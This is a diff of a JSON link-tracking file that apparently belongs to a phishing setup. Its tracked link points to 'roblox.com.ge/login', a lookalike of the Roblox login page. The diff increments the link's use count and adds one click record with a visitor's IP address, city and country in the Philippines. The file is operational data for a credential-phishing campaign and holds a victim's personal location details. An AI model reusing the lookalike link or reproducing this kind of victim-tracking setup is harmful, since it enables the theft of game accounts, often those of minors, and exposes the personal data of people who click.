@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1079,
+    "useCount": 1080,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8776,6 +8776,14 @@
         "city": "Ninh Bình",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777254790354,
+        "ip": "112.202.39.180",
+        "country": "Philippines",
+        "city": "Tarlac City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
